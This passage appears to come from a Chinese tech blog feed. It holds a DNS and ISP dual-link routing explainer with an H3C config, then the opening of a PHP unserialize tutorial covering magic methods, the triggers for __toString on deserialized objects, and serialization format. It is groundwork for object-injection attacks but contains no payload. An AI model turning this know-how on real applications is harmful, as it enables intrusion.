href=\"#dns概述\">#</a> DNS 概述</h2>\n<p>DNS 是 Domain Name System 的缩写，也就是 域名解析系统，它的作用非常简单，就是根据域名查出对应的 IP 地址。</p>\n<p>你可以把它想象成一本巨大的电话本，比如当你要访问域名 <code>www.163.com</code> ，首先要通过 DNS 查出它的 IP 地址是 <code>112.48.162.8</code> 。</p>\n<p>为啥需要解析捏？ 因为域名是给人看的，你只能通过 IP 的方式访问资源，但是让你背 IP 你又不干，而且最坏的情况是他用了 CDN 或者负载均衡，导致他的 IP 更多了，你更不想背了，所以我们有了 DNS，将域名解析成 IP，我们只需要输入域名，域名通过 DNS 解析成 IP，最终访问到资源。</p>\n<p>注意：上面的 DNS 解析对于用户来说是透明的，你并不知道你输入 www.bilibili.com 后到底他给你解析了那个 IP。而如果你真想知道为啥会给你解析成某个 IP，要取决于对方有没有使用 CDN 和一些其他因素</p>\n<h2 id=\"dns资源记录\"><a class=\"markdownIt-Anchor\" href=\"#dns资源记录\">#</a> DNS 资源记录</h2>\n<p>在 DNS 服务器上，一个域名及其下级域名组成一个区域 （Zone）。一个 Zone 的 相关的 DNS 信息构成一个数据库文件。</p>\n<p>下面是一条 A 类型的资源记录（简称为 A 记录）：域名 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy56ZG5zLmNu\">www.zdns.cn</span> 的数据为 202.173.11.10</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20210704153331929.png\" alt=\"在这里插入图片描述\"></p>\n<p>记录一条域名信息映射关系，称之为资源记录（RR）。当我们查询域名 www.zdns.cn 的时候，查询结果得到的资源记录结构体中有如下数据：</p>\n<ul>\n<li>TTL，就是生存周期，是递归服务器会在缓存中保存该资源记录的时长。</li>\n<li>网络 / 协议类型，它的代表的标识是 IN，IN 就是 internet，目前 DNS 系统主要支持的协议是 IN。</li>\n<li>type，就是资源记录类型，一般的网站都是都是 A 记录（IPv4 的主机地址）。</li>\n<li>rdata 是资源记录数据，就是域名关联的信息数据。</li>\n</ul>\n<p>常见的资源记录类型如表所示。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126101836133.png\" alt=\"image-20221126101836133\"></p>\n<p><strong>A 记录：又称 IP 指向</strong></p>\n<p>用户可以在此设置子域名并指向到自己的目标主机地址上，从而实现通过域名找到服务器。</p>\n<blockquote>\n<p>说明：指向的目标主机地址类型只能使用 IP 地址；<br>\n附加说明：</p>\n<ul>\n<li>\n<p>泛域名解析即将该域名所有未指定的子域名都指向一个空间。在 “主机名” 中填入 *，“类型” 为 A，“IP 地址 / 主机名” 中填入 web 服务器的 IP 地址，点击 “新增” 按钮即可。</p>\n</li>\n<li>\n<p>负载均衡的实现：负载均衡 (Server Load Balancing，SLB) 是指在一系列资源上面动态地分布网络负载。负载均衡可以减少网络拥塞，提高整体网络性能，提高自愈性， 并确保企业关键性应用的可用性。</p>\n<p>当相同子域名有多个目标地址时，表示轮循，可以达到负载均衡的目的，但需要虚拟主机服务商支持。</p>\n</li>\n</ul>\n</blockquote>\n<p><strong>CNAME : 通常称别名指向。</strong></p>\n<p>您可以为一个主机设置别名。<br>\n比如设置 <span class=\"exturl\" data-url=\"aHR0cDovL3Rlc3QubXlkb21haW4uY29t\">test.mydomain.com</span>，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS13d3ctcDE4ZG9odmRzMTFjbzgzYXQ1aGVtYXc1MGsucmRkbnMuY29t\">用来指向一个主机 www.rddns.com</span> , 那么以后就可以用 test.mydomain.com 来代替访问 www.rddns.com 了。</p>\n<p>说明：・</p>\n<ul>\n<li>CNAME 的目标主机地址只能使用主机名，不能使用 IP 地址；</li>\n<li>主机名前不能有任何其他前缀，如：<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1paHF4MWZoOHo1M29sdGZucHdpMmUv\">http:// 等是不被允许的</span>；</li>\n<li>A 记录优先于 CNAME 记录。即如果一个主机地址同时存在 A 记录和 CNAME 记录，则 CNAME 记录不生效。</li>\n</ul>\n<p><strong>NS 记录：指向 DNS 子域名</strong></p>\n<p>服务器解析记录，用来表明由哪台服务器对该域名进行解析。这里的 NS 记录只对子域名生效。</p>\n<p>例如用户希望由 12.34.56.78 这台服务器解析 <span class=\"exturl\" data-url=\"aHR0cDovL25ld3MubXlkb21haW4uY29t\">news.mydomain.com</span>，则需要设置 <span class=\"exturl\" data-url=\"aHR0cDovL25ld3MubXlkb21haW4uY29t\">news.mydomain.com</span> 的 NS 记录。</p>\n<p>说明：</p>\n<ul>\n<li>“优先级” 中的数字越小表示级别越高；</li>\n<li>“IP 地址 / 主机名” 中既可以填写 IP 地址，也可以填写像 <span class=\"exturl\" data-url=\"aHR0cDovL25zLm15ZG9tYWluLmNvbQ==\">ns.mydomain.com</span> 这样的主机地址，但必须保证该主机地址有效。</li>\n</ul>\n<blockquote>\n<p>如，将 news.mydomain.com 的 NS 记录指向到 <span class=\"exturl\" data-url=\"aHR0cDovL25zLm15ZG9tYWluLmNvbQ==\">ns.mydomain.com</span>，在设置 NS 记录的同时还需要设置 ns.mydomain.com 的指向，否则 NS 记录将无法正常解析；</p>\n</blockquote>\n<ul>\n<li>NS 记录优先于 A 记录。</li>\n</ul>\n<blockquote>\n<p>即，如果一个主机地址同时存在 NS 记录和 A 记录，则 A 记录不生效。这里的 NS 记录只对子域名生效。</p>\n</blockquote>\n<h2 id=\"解析过程\"><a class=\"markdownIt-Anchor\" href=\"#解析过程\">#</a> 解析过程</h2>\n<p>1、缓存查找 IP</p>\n<p>2、本机的 hosts 文件查找 IP</p>\n<p>3、DNS 服务器查找 IP</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20210705144630547.png\" alt=\"在这里插入图片描述\"></p>\n<p><strong>从递归和迭代查询可以看出：</strong></p>\n<p>客户端 - 本地 dns 服务端：</p>\n<blockquote>\n<p>这部分属于递归查询。递归查询时，返回的结果只有两种：查询成功或查询失败.</p>\n</blockquote>\n<p>本地 dns 服务端 — 外网：</p>\n<blockquote>\n<p>这部分属于迭代查询。迭代查询，又称作重指引，返回的是最佳的查询点或者主机地址.</p>\n</blockquote>\n<blockquote>\n<ol>\n<li>浏览器先检查自身缓存中有没有被解析过的这个域名对应的 ip 地址，如果有，解析结束。同时域名被缓存的时间也可通过 TTL 属性来设置。</li>\n<li>如果浏览器缓存中没有（专业点叫还没命中），浏览器会检查操作系统缓存中有没有对应的已解析过的结果。而操作系统也有一个域名解析的过程。在 windows 中可通过 c 盘里一个叫 hosts 的文件来设置，如果你在这里指定了一个域名对应的 ip 地址，那浏览器会首先使用这个 ip 地址。</li>\n</ol>\n<blockquote>\n<p>但是这种操作系统级别的域名解析规程也被很多黑客利用，通过修改你的 hosts 文件里的内容把特定的域名解析到他指定的 ip 地址上，造成所谓的域名劫持。所以在 windows7 中将 hosts 文件设置成了 readonly，防止被恶意篡改。</p>\n</blockquote>\n<ol>\n<li>如果至此还没有命中域名，才会真正的请求本地域名服务器（LDNS）来解析这个域名，这台服务器一般在你的城市的某个角落，距离你不会很远，并且这台服务器的性能都很好，一般都会缓存域名解析结果，大约 80% 的域名解析到这里就完成了。</li>\n<li>如果 LDNS 仍然没有命中，就直接跳到 Root Server 域名服务器请求解析</li>\n<li>根域名服务器返回给 LDNS 一个所查询域的主域名服务器（gTLD Server，国际顶尖域名服务器，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1idnMuY29t\">如.com</span> .cn .org 等）地址</li>\n<li>此时 LDNS 再发送请求给上一步返回的 gTLD</li>\n<li>接受请求的 gTLD 查找并返回这个域名对应的 Name Server 的地址，这个 Name Server 就是网站注册的域名服务器</li>\n<li>Name Server 根据映射关系表找到目标 ip，返回给 LDNS</li>\n<li>LDNS 缓存这个域名和对应的 ip</li>\n<li>LDNS 把解析的结果返回给用户，用户根据 TTL 值缓存到本地系统缓存中，域名解析过程至此结束</li>\n</ol>\n</blockquote>\n<p><strong>记住这个解析过程，后面要考</strong></p>\n<h1 id=\"举两个例子\"><a class=\"markdownIt-Anchor\" href=\"#举两个例子\">#</a> 举两个例子</h1>\n<p>腾讯连接了两家运营商电信和联通，电信访问内部服务的流量大，联通的少，怎么把电信流入的流量扔一些给联通</p>\n<blockquote>\n<p>这道题的侧重点在于控制用户侧和运营商侧，因为如果要控制腾讯侧，那么流量已经到了腾讯的防火墙上，不能实现流量控制。</p>\n<p>有两种可能的解法，dns 和 cdn，个人理解，cdn 其实是一种分布式 dns 的解法，两种解法的本质都是控制通过控制 dns 的解析来控制流量选路</p>\n<p>1.dns</p>\n<p>上面也提过 DNS 的解析过程了，那么我们需要控制的就是用户来解析域名时候返回的 IP。</p>\n<p>一般来说，联通用户解析出联通的 IP 访问速度肯定是最快的，但是当电信的访问拥塞时，我们可以给电信的用户在解析时返回联通的 IP，让电信用户通过联通访问，而众所周知，电信和联通可定是可以互通的，只不过是次优路径的问题，因此我们无需关注电信是怎么找到联通的。就像你以前在下游戏的时候，你也不会先看看自己是电信的 IP 还是联通的 IP 再下载，通常看心情随便一点，甚至还可以点到铁通去。</p>\n<p>那么还有个问题是运营商 / 腾讯怎么知道你的 IP 是电信还是联通的。其实每个 IP 都是可以查到归属的，我们只需要增加一个查表或者查缓存的过程罢了</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126105505371.png\" alt=\"image-20221126105505371\"></p>\n<p>2.cdn</p>\n<p>cdn 本质就是也是通过 dns 解析返回给你一个离你最近的一个边缘节点的 IP，只不过这个 IP 解析比较曲折，上面在将 cdn 的时候也讲过了，应用 CDN 后，DNS 返回的不再是 IP 地址，而是一个 CNAME (Canonical Name) 别名记录，指向 CDN 的全局负载均衡 GSLB, GSLB 实际上在域名解析的过程中承担了中间人（或者说代理）的角色，这是 CDN 实现的关键。CDN 负载均衡设备根据用户 IP 地址，以及用户请求的内容 URL，选择一台用户所属区域的<strong>缓存服务器</strong>。负载均衡设备告诉用户这台缓存服务器的 IP 地址，让用户向所选择的缓存服务器发起请求。并且 CDN 可以监控链路质量，实现动态切换和找到负载较轻的节点</p>\n<p>3. 负载均衡，nginx，redis (这个没啥用，但可以在这里写一笔)</p>\n<p>因为这明显是已经进入腾讯内部之后了，nginx 的负载均衡和 redis 的负载均衡在集群的场景下确实是有很大作用滴</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126110209123.png\" alt=\"image-20221126110209123\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126110225565.png\" alt=\"image-20221126110225565\" style=\"zoom:50%;\" />·</p>\n</blockquote>\n<p>或者你有两个出口电信和联通，怎么控制选路</p>\n<blockquote>\n<p>这道题侧重点在于流量出去，也是在本 AS 内控制选路</p>\n<p>1.PBR 策略路由</p>\n<p>略路由 PBR（Policy-Based Routing）是一种依据用户制定的策略进行路由选择的机制，分为本地策略路由、接口策略路由和智能策略路由 SPR</p>\n<p>路由策略（route-policy）与策略路由（policy based route）区别</p>\n<ul>\n<li>\n<p>策略路由的操作对象是数据包，在路由表已经产生的情况下，不按照路由表进行转发，而是根据需要，依照某种策略改变数据包转发路径。</p>\n</li>\n<li>\n<p>路由策略的操作对象是路由信息。路由策略主要实现了路由过滤和路由属性设置等功能，它通过改变路由属性（包括可达性）来改变网络流量所经过的路径。</p>\n</li>\n</ul>\n<p>传统的路由转发原理是首先根据报文的目的地址查找路由表，然后进行报文转发。但是目前越来越多的用户希望能够在传统路由转发的基础上根据自己定义的策略进行报文转发和选路。策略路由使网络管理者不仅能够根据报文的目的地址，而且能够根据报文的源地址、报文大小和链路质量等属性来制定策略路由，以改变数据包转发路径，满足用户需求。</p>\n<p>如果联通的流量很少，但电信流量很大，可以通过 PBR 强制改变路由选路实现流量迁移</p>\n<p>多说一句，其实我们的组网可以使用负载分担双联路方案</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126112007676.png\" alt=\"image-20221126112007676\" style=\"zoom:67%;\" />\n<p>\\1. 2 条链路能同时使用，一半 PC 优先选择电信，另外一半 PC 优先选择联通；</p>\n<p>\\2. 2 条链路为主备方式，电信线路为主，联通线路为备；</p>\n<p>\\3. 但可以实现电信线路断开，所有 PC 选择联通线路，联通线路故障，所有 PC 选择电信。</p>\n<p>其实基本原理还是策略路由，我们可以通过源 IP 奇偶性控制选路</p>\n<p>\\1. 由于策略路由只控制奇数 IP，所以偶数 IP 默认情况下就是优选电信线路，电信线路 Down 情况下选择联通线路，这和传统解决方案一致；</p>\n<p>\\2. 关键的是奇数 IP，奇数 IP 在策略路由的控制下，优选了联通线路，PBR 有一个特性，如果出接口联通线路 Down，则 PBR 失效，奇数 IP 恢复正常的路由转发，选择电信线路。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">acl number 2000</span><br><span class=\"line\">rule permit source 0.0.0.1 255.255.255.254</span><br><span class=\"line\">#</span><br><span class=\"line\">policy-based-route mypbr permit node 5</span><br><span class=\"line\">if-match acl 2000</span><br><span class=\"line\">apply ip-address next-hop 联通网关</span><br><span class=\"line\">#</span><br><span class=\"line\">interface vlan-interface1</span><br><span class=\"line\">ip address 192.168.1.1 255.255.255.0</span><br><span class=\"line\">ip policy-based-route mypbr</span><br><span class=\"line\">#</span><br><span class=\"line\">ip route-static 0.0.0.0 0.0.0.0 电信网关</span><br><span class=\"line\">ip route-static 0.0.0.0 0.0.0.0 联通网关 preference 80</span><br></pre></td></tr></table></figure>\n<p>2.DNS 选路</p>\n<p>和上面的案例一样，只不过由于我们这次可以在内网控制，我们不一定要依赖运营商的 DNS 解析，比如学校里我们可以使用自己的 DNS 解析一部分地址，将其解析到空闲的链路上</p>\n<p>3. 控制 preference</p>\n<p>ip route-static 0.0.0.0 0 192.168.1.254 preference 10</p>\n<p>将希望优先选择的链路优先级改小，实现优先选路</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaDNjLmNvbS9jbi9kXzIwMTAxMC82OTc2NjRfOTc2NjVfMC5odG0=\">技术点详解 — 互联网双出口的选择 - IP 技术专栏 - 技术甜甜圈 - 新华三集团 - H3C</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3JhenltYWtlcmNpcmNsZS9wLzE0OTc2NjEyLmh0bWwjYXV0b2lkLWgzLTExLTAtNg==\">DNS 图解（秒懂 - 史上最全） - 疯狂创客圈 - 博客园 (cnblogs.com)</span></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/08/16/Unserialize/",
            "url": "http://example.com/2022/08/16/Unserialize/",
            "title": "unserialize",
            "date_published": "2022-08-16T05:38:45.000Z",
            "content_html": "<h1 id=\"unserialize\"><a class=\"markdownIt-Anchor\" href=\"#unserialize\">#</a> Unserialize</h1>\n<h2 id=\"1php\"><a class=\"markdownIt-Anchor\" href=\"#1php\">#</a> 1.php</h2>\n<h3 id=\"类与对象\"><a class=\"markdownIt-Anchor\" href=\"#类与对象\">#</a> 类与对象</h3>\n<p>类是定义一系列属性和操作的模板，而对象，就是把属性进行实例化，完事交给类里面的方法，进行处理。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class people&#123;</span><br><span class=\"line\">   //定义类属性（类似变量）,public 代表可见性（公有）</span><br><span class=\"line\">    public $name = &#x27;joker&#x27;;</span><br><span class=\"line\">   //定义类方法（类似函数）</span><br><span class=\"line\">   public function smile()&#123;</span><br><span class=\"line\">        echo $this-&gt;name.&quot; is smile...\\n&quot;;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$psycho = new people(); //根据people类实例化对象</span><br><span class=\"line\">$psycho-&gt;smile();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"魔法方法\"><a class=\"markdownIt-Anchor\" href=\"#魔法方法\">#</a> 魔法方法</h3>\n<p>为什么被称为魔法方法呢？因为是在触发了某个事件之前或之后，魔法函数会自动调用执行，而其他的普通函数必须手动调用才可以执行。PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以双下划线为前缀。</p>\n<table>\n<thead>\n<tr>\n<th>方法名</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>__construct</td>\n<td>构造函数，在创建对象时候初始化对象，一般用于对变量赋初值</td>\n</tr>\n<tr>\n<td>__destruct</td>\n<td>析构函数，和构造函数相反，在对象不再被使用时 (将所有该对象的引用设为 null) 或者程序退出时自动调用</td>\n</tr>\n<tr>\n<td>__toString</td>\n<td>当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串，例如 echo 打印出对象就会调用此方法</td>\n</tr>\n<tr>\n<td>__wakeup()</td>\n<td>使用 unserialize 时触发，反序列化恢复对象之前调用该方法</td>\n</tr>\n<tr>\n<td>__sleep()</td>\n<td>使用 serialize 时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组 (该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</td>\n</tr>\n<tr>\n<td>__destruct()</td>\n<td>对象被销毁时触发</td>\n</tr>\n<tr>\n<td>__call()</td>\n<td>在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法</td>\n</tr>\n<tr>\n<td>__callStatic()</td>\n<td>在静态上下文中调用不可访问的方法时触发</td>\n</tr>\n<tr>\n<td>__get()</td>\n<td>读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）</td>\n</tr>\n<tr>\n<td>__set()</td>\n<td>在给不可访问属性赋值时，即在调用私有属性的时候会自动执行</td>\n</tr>\n<tr>\n<td>__isset()</td>\n<td>当对不可访问属性调用 isset () 或 empty () 时触发</td>\n</tr>\n<tr>\n<td>__unset()</td>\n<td>当对不可访问属性调用 unset () 时触发</td>\n</tr>\n<tr>\n<td>__invoke()</td>\n<td>当脚本尝试将对象调用为函数时触发</td>\n</tr>\n</tbody>\n</table>\n<p>额外提一下__tostring 的具体触发场景：</p>\n<blockquote>\n<p>(1) echo(<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>o</mi><mi>b</mi><mi>j</mi><mo stretchy=\"false\">)</mo><mi mathvariant=\"normal\">/</mi><mi>p</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>t</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">obj) / print(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mclose\">)</span><span class=\"mord\">/</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">t</span><span class=\"mopen\">(</span></span></span></span>obj) 打印时会触发</p>\n<p>(2) 反序列化对象与字符串连接时</p>\n<p>(3) 反序列化对象参与格式化字符串时</p>\n<p>(4) 反序列化对象与字符串进行<mark>比较时（PHP 进行</mark>比较的时候会转换参数类型）</p>\n<p>(5) 反序列化对象参与格式化 SQL 语句，绑定参数时</p>\n<p>(6) 反序列化对象在经过 php 字符串函数，如 strlen ()、addslashes () 时</p>\n<p>(7) 在 in_array () 方法中，第一个参数是反序列化对象，第二个参数的数组中有 toString 返回的字符串的时候 toString 会被调用</p>\n<p>(8) 反序列化的对象作为 class_exists () 的参数的时候</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    class animal &#123;</span><br><span class=\"line\">        private $name = &#x27;caixukun&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">        public function sleep()&#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo $this-&gt;name . &quot; is sleeping...\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public function __wakeup()&#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo &quot;调用了__wakeup()方法\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public function __construct()&#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo &quot;调用了__construct()方法\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public function __destruct()&#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo &quot;调用了__destruct()方法\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public function __toString()&#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo &quot;调用了__toString()方法\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public function __set($key, $value)&#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo &quot;调用了__set()方法\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public function __get($key) &#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo &quot;调用了__get()方法\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    $ji = new animal();</span><br><span class=\"line\">    $ji-&gt;name = 1;</span><br><span class=\"line\">    echo $ji-&gt;name;</span><br><span class=\"line\">    $ji-&gt;sleep();</span><br><span class=\"line\">    $ser_ji = serialize($ji);</span><br><span class=\"line\">    //print_r($ser_ji);</span><br><span class=\"line\">    print_r(unserialize($ser_ji))</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//最后调用的结果是：</span><br><span class=\"line\">调用了__construct()方法</span><br><span class=\"line\">调用了__set()方法</span><br><span class=\"line\">调用了__get()方法</span><br><span class=\"line\">caixukun is sleeping...</span><br><span class=\"line\">调用了__wakeup()方法 animal Object ( [name:animal:private] =&gt; caixukun )</span><br><span class=\"line\">调用了__destruct()方法</span><br><span class=\"line\">调用了__destruct()方法</span><br></pre></td></tr></table></figure>\n<h3 id=\"序列化与反序列化\"><a class=\"markdownIt-Anchor\" href=\"#序列化与反序列化\">#</a> 序列化与反序列化</h3>\n<p>在开发的过程中常常遇到需要把对象或者数组进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到 mysql 数据库中时，我们时常需要将数组进行序列号操作。</p>\n<p>php 序列化（serialize）：是将变量转换为可保存或传输的字符串的过程</p>\n<p>php 反序列化（unserialize）：就是在适当的时候把这个字符串再转化成原来的变量使用</p>\n<p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p>\n<p>常见的 php 系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。</p>\n<h4 id=\"序列化\"><a class=\"markdownIt-Anchor\" href=\"#序列化\">#</a> 序列化</h4>\n<p><strong>需要注意的是变量受到不同修饰符（public，private，protected）修饰进行序列化时，序列化后变量的长度和名称会发生变化</strong>。</p>\n<ul>\n<li>使用 public 修饰进行序列化后，变量 $team 的长度为 4，正常输出。</li>\n<li>使用 private 修饰进行序列化后，会在变量 $team_name 前面加上类的名称，在这里是 object，并且长度会比正常大小多 2 个字节，也就是 9+6+2=17。</li>\n<li>使用 protected 修饰进行序列化后，会在变量 $team_group 前面加上 *，并且长度会比正常大小多 3 个字节，也就是 10+3=13。</li>\n</ul>\n<p>通过对比发现，在受保护的成员前都多了两个字节，受保护的成员在序列化时规则：</p>\n<blockquote>\n<ol>\n<li>\n<p>受 Private 修饰的私有成员，序列化时: \\x00 + [私有成员所在类名] + \\x00 [变量名]</p>\n</li>\n<li>\n<p>受 Protected 修饰的成员，序列化时：\\x00 + * + \\x00 + [变量名]</p>\n</li>\n</ol>\n<p>其中，&quot;\\x00&quot; 代表 ASCII 为 0 的值，即空字节，&quot;*&quot; 必不可少。</p>\n</blockquote>\n<p>验证一下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class object&#123;</span><br><span class=\"line\">    public $team = &#x27;joker&#x27;;</span><br><span class=\"line\">    private $team_name = &#x27;hahaha&#x27;;</span><br><span class=\"line\">    protected $team_group = &#x27;biubiu&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">    function hahaha()&#123;</span><br><span class=\"line\">        $this-&gt;$team_members = &#x27;奥力给&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$object = new object();</span><br><span class=\"line\">echo serialize($object);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">O:6:&quot;object&quot;:3:&#123;s:4:&quot;team&quot;;s:5:&quot;joker&quot;;s:17:&quot;objectteam_name&quot;;s:6:&quot;hahaha&quot;;s:13:&quot;*team_group&quot;;s:6:&quot;biubiu&quot;;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">如果我们使用urlencode输出时</span><br><span class=\"line\">O%3A6%3A%22object%22%3A3%3A%7Bs%3A4%3A%22team%22%3Bs%3A5%3A%22joker%22%3Bs%3A17%3A%22%00object%00team_name%22%3Bs%3A6%3A%22hahaha%22%3Bs%3A13%3A%22%00%2A%00team_group%22%3Bs%3A6%3A%22biubiu%22%3B%7D</span><br><span class=\"line\"></span><br><span class=\"line\">就能很明显的看到%00和*了</span><br><span class=\"line\"></span><br><span class=\"line\">以上是序列化之后的结果，o代表是一个对象，6是对象object的长度，3的意思是有三个类属性，后面花括号里的是类属性的内容，s表示的是类属性team的类型，4表示类属性team的长度，后面的以此类推。</span><br><span class=\"line\"></span><br><span class=\"line\">值得一提的是，类方法并不会参与到实例化里面。</span><br></pre></td></tr></table></figure>\n<p>序列化格式中的字母含义：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td 